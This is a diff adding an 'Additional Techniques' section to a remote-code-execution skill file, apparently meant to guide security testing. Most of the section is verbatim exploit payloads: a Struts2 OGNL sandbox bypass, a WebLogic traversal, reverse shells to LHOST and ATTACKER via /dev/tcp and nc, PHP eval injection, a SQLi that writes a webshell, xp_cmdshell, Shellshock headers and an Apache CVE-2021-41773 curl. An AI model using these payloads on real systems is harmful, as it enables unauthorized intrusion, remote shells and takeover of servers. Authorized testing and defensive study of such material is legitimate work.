@@ -236,3 +236,61 @@ pop graphic-context
 ## Summary
 
 RCE is a property of the execution boundary. Find the sink, establish a quiet oracle, and escalate to durable control only as far as necessary. Validate across transports and environments; defenses often differ per code path.
+
+
+## Additional Techniques — ported from WebSkills (writeup-techniques/rce)
+
+Corpus-derived concrete framework payloads, chained-sink patterns, and CVE/bounty provenance that complement the technique-category methodology above. Additive only. (Reverse-shell banks, upload→webshell polyglots, and gadget-chain internals live in the fork's `insecure_file_uploads`, `deserialization`, and `framework_1day_rce` skills — not duplicated here.)
+
+### Struts2 OGNL RCE (verbatim, sent via `Content-Type` header)
+Clears the OGNL sandbox, resets member access, then runs an OS command cross-platform:
+```
+...#ognlUtil.getExcludedPackageNames().clear())...#context.setMemberAccess(#dm)))
+.(#cmd='COMMAND').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))
+.(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds))
+.(#p.redirectErrorStream(true)).(#process=#p.start())...IOUtils@copy(#process.getInputStream(),#ros)
+```
+Sandbox-bypass note: the payload explicitly clears `getExcludedPackageNames()`/`getExcludedClasses()` and resets `MemberAccess` before invoking `ProcessBuilder`.
+
+### Other Java-framework sinks (verbatim)
+```
+# WebLogic console.portal mvel (UNAUTH) — double-encoded traversal + ShellSession
+/console/images/%252E%252E%252Fconsole.portal?...handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec();")
+# gremlin-groovy graph query → ProcessBuilder
+Class.forName("java.lang.ProcessBuilder")...newInstance(Arrays.asList("bash","-c","bash -i>&/dev/tcp/LHOST/LPORT 0>&1"))
+```
+
+### PHP code-injection sinks (not just unserialize/PHAR)
+`preg_replace` with the `/e` (a.k.a. `#ies`) modifier evals the replacement — inject PHP through the captured group; also `data://` and `php://input` as code sources when `include`/`eval`/`file_get_contents` take a user path:
+```
+preg_replace("#\[catlist=(.+?)\](.*?)\[/catlist\]#ies", "check_category('\1','\2')", $in)   // DataLife Engine
+data://text/plain;base64,<b64 of <?php system("id"); ?>>                                     // write-and-run
+<?php eval(file_get_contents('php://input')); ?>                                             // then POST code to php://input
+```
+
+### SQLi → RCE (webshell / OS command)
+```
+# MySQL UNION writes a PHP shell to webroot
+' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/rce.php'-- -
+# MSSQL stacked xp_cmdshell (can even stage an EXE via echo-hex)
+sGroupList=1;EXEC xp_cmdshell 'whoami';--
+```
+
+### Shellshock (CVE-2014-6271) — Bash env-var CGI RCE via header
+The `() { :;};` prefix smuggles a command into a Bash function definition; rides in an HTTP header, bypassing body/param filters entirely:
+```
+curl -H 'User-Agent: () { :; }; /bin/cat /etc/passwd' http://target/cgi-bin/<script>
+User-Agent: () { :;}; /usr/bin/nc ATTACKER 443 -e /bin/sh
+```
+
+### Apache path-traversal → CGI RCE (CVE-2021-41773 / 42013)
+Double-URL-encode the dot to slip traversal past the normalizer into `/cgi-bin/` → `/bin/sh`; POST body is the command:
+```
+curl "$T/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; id"
+```
+
+### `go get` RCE (CVE-2018-6574)
+A malicious/typosquatted import path triggers code execution during `go get` on dev workstations and build systems (CWE-94) — a supply-chain sink worth flagging on CI/CD and developer-facing targets.
+
+### CVE-by-pattern + bounty provenance (defeat "not exploitable" pushback)
+ExifTool metadata RCE **CVE-2021-22204** (GitLab DjVu-in-JPEG upload, $20,000 / 504 upvotes) · Kramdown Wiki unsafe-inline $20,000 · Git flag-injection → file overwrite → RCE $12,000 · RCE via GitHub import $33,510 · DecompressedArchiveSizeValidator BulkImports $33,510 · node-serialize CVE-2017-5941 · php-fpm CVE-2019-11043. Always cite the concrete injectable param + exact sink line, and state auth precisely (unauth pre-auth RCE = max severity).
